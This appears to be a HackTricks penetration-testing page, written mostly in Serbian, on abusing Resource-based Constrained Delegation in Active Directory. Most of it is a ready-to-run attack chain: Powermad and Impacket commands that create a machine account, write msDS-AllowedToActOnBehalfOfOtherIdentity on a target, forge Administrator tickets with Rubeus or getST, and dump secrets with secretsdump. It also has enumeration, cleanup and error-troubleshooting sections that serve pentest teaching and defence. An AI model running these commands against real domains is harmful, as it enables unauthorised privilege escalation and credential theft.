# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Ovo je slično osnovnom [Constrained Delegation](constrained-delegation.md) ali **umesto** dа se daju dozvole jednom **objektu** da **impersonate any user against a machine**. Resource-based Constrain Delegation **postavlja** u **objekt ko može da impersonate any user against it**.

U ovom slučaju, ograničeni objekat će imati atribut nazvan _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ sa imenom korisnika koji može da impersonate bilo kog drugog korisnika prema njemu.

Još jedna važna razlika u odnosu na ovu Constrained Delegation i druge delegacije je što bilo koji korisnik sa **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) može da postavi **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (In the other forms of Delegation you needed domain admin privs).

### New Concepts

Ranije, kod Constrained Delegation, govorilo se da je zastavica **`TrustedToAuthForDelegation`** unutar vrednosti _userAccountControl_ korisnika potrebna da bi se izvršio **S4U2Self.** Ali to nije sasvim tačno.\
Realnost je da čak i bez te vrednosti, možete da izvedete **S4U2Self** protiv bilo kog korisnika ako ste **service** (imate SPN), ali ako **imate `TrustedToAuthForDelegation`** vraćeni TGS će biti **Forwardable**, a ako **nemate** tu zastavicu vraćeni TGS **neće** biti **Forwardable**.

Međutim, ako je **TGS** koji se koristi u **S4U2Proxy** **NOT Forwardable**, pokušaj zloupotrebe **basic Constrain Delegation** **neće raditi**. Ali ako pokušavate da iskoristite **Resource-Based constrain delegation**, radiće.

### Attack structure

> Ako imate **write equivalent privileges** nad **Computer** account-om možete dobiti **privileged access** na toj mašini.

Pretpostavimo da napadač već ima **write equivalent privileges over the victim computer**.

1. Napadač **kompromituje** nalog koji ima **SPN** ili **kreira jedan** (“Service A”). Imajte u vidu da **bilo koji** _Admin User_ bez drugih specijalnih privilegija može **kreirati** do 10 Computer objekata (**_MachineAccountQuota_**) i postaviti im **SPN**. Dakle napadač može jednostavno kreirati Computer objekat i postaviti SPN.
2. Napadač **zlorabi svoje WRITE privilegije** nad žrtvinim računarom (ServiceB) da konfiguriše **resource-based constrained delegation da dozvoli ServiceA da impersonate any user** prema tom žrtvinom računaru (ServiceB).
3. Napadač koristi Rubeus da izvede **full S4U attack** (S4U2Self i S4U2Proxy) sa Service A na Service B za korisnika **sa privileged access to Service B**.
1. S4U2Self (sa kompromitovanog/kreiranog SPN naloga): Traži **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Koristi **not Forwardable TGS** iz prethodnog koraka da zatraži **TGS** od **Administrator** ka **victim host**.
3. Čak i ako koristite not Forwardable TGS, pošto iskorišćavate Resource-based constrained delegation, radiće.
4. Napadač može da **pass-the-ticket** i **impersonate** korisnika da bi stekao **access to the victim ServiceB**.

Da biste proverili _**MachineAccountQuota**_ domena možete koristiti:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Napad

### Kreiranje objekta računara

Možete kreirati objekat računara u okviru domena koristeći **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurisanje Resource-based Constrained Delegation

**Korišćenje activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korišćenje powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Izvođenje kompletnog S4U napada (Windows/Rubeus)

Prvo smo kreirali novi Computer object sa lozinkom `123456`, tako da nam treba hash te lozinke:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Ovo će ispisati RC4 i AES hashes za taj nalog.\
Sada se attack može izvesti:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Možete generisati više tickets za više servisa tako što ćete jednom koristiti parametar `/altservice` alata Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Imajte na umu da korisnici imaju atribut nazvan "**Cannot be delegated**". Ako je taj atribut postavljen na True za korisnika, nećete moći da ga impersonirate. Ovu osobinu možete videti u bloodhound.

### Linux alati: kompletan RBCD lanac pomoću Impacket (2024+)

Ako radite na Linuxu, možete izvesti kompletan RBCD lanac koristeći zvanične Impacket alate:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Napomene
- Ako je LDAP signing/LDAPS primenjeno, koristite `impacket-rbcd -use-ldaps ...`.
- Dajte prednost AES ključevima; mnogi savremeni domeni ograničavaju RC4. Impacket i Rubeus podržavaju tokove koji koriste samo AES.
- Impacket može prepisati `sname` ("AnySPN") za neke alate, ali nabavite ispravan SPN kad god je to moguće (npr. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Pristup

Poslednja komandna linija će izvršiti **potpuni S4U napad i ubaciti TGS** od Administratora na ciljni host u **memoriji**.\
U ovom primeru je zatražen TGS za **CIFS** service od Administratora, tako da ćete moći da pristupite **C$**:
```bash
ls \\victim.domain.local\C$
```
### Zloupotreba različitih service tickets

Saznajte više o [**available service tickets here**](silver-ticket.md#available-services).

## Enumeracija, revizija i čišćenje

### Enumerisanje računara sa RBCD konfiguracijom

PowerShell (dekodiranje SD da bi se razrešile SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (pročitati ili isprazniti jednom komandom):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Čišćenje / resetovanje RBCD

- PowerShell (očistiti atribut):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos greške

- **`KDC_ERR_ETYPE_NOTSUPP`**: Ovo znači da je Kerberos podešen da ne koristi DES ili RC4 i da šaljete samo RC4 hash. Dostavite Rubeusu bar AES256 hash (ili pošaljite rc4, aes128 i aes256 hasheve). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Ovo znači da je vreme na trenutnom računaru različito od vremena na DC-u i da Kerberos ne radi ispravno.
- **`preauth_failed`**: Ovo znači da dati username + hashevi ne funkcionišu za prijavu. Možda ste zaboravili da stavite "$" unutar username-a pri generisanju hash-eva (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Ovo može značiti:
- Korisnik kojeg pokušavate da impersonirate ne može da pristupi željenoj usluzi (jer ga ne možete impersonirati ili zato što nema dovoljno privilegija)
- Tražena usluga ne postoji (npr. tražite ticket za winrm ali winrm nije pokrenut)
- Lažni računar koji je kreiran izgubio je privilegije nad ranjivim serverom i potrebno ih je vratiti.
- Abuzirate klasični KCD; zapamtite da RBCD radi sa non-forwardable S4U2Self ticket-ovima, dok KCD zahteva forwardable.

## Napomene, relays i alternative

- Takođe možete upisati RBCD SD preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains frequently end in RBCD to achieve local SYSTEM in one step. See practical end-to-end examples:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- If LDAP signing/channel binding are **disabled** and you can create a machine account, tools like **KrbRelayUp** can relay a coerced Kerberos auth to LDAP, set `msDS-AllowedToActOnBehalfOfOtherIdentity` for your machine account on the target computer object, and immediately impersonate **Administrator** via S4U from off-host.

## Reference

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
